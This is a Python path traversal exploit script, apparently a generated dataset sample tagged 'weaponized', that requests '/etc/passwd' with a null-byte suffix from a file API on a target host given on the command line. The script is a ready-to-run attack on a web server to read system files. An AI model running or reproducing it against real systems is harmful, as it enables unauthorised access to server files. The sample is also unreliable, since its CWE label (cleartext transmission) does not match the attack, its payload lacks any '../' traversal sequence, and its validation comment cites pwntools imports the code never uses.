"""
Metadata:
{
  "architecture": "64-bit",
  "protocol": "HTTP",
  "offset": null,
  "platform": "Linux",
  "cwe": "CWE-319: Cleartext Transmission of Sensitive Data",
  "weaponized": true
}
"""
# Validation: {'valid': True, 'syntax_valid': True, 'imports_valid': False, 'warnings': ['Missing imports: pwntools', 'Missing exploit elements: connection, send'], 'errors': []}

import requests
import sys
from urllib.parse import unquote

def exploit_path_traversal(target='http://192.168.1.157:8080'):
    # Path Traversal payload
    payload = '/etc/passwd%00.pdf'

    # Craft the request
    response = requests.get(f'{target}/api/files?filename={payload}')

    # Check response
    if response.status_code == 200:
        print(f"[+] Successfully exploited Path Traversal on {target}")
        print(f"Response: {unquote(response.text)}")
    else:
        print(f"[-] Failed to exploit Path Traversal on {target}")

    return response.text

if __name__ == "__main__":
    # Handle target URL from command line argument
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = 'http://192.168.1.157:8080'

    # Execute the exploit
    exploit_path_traversal(target)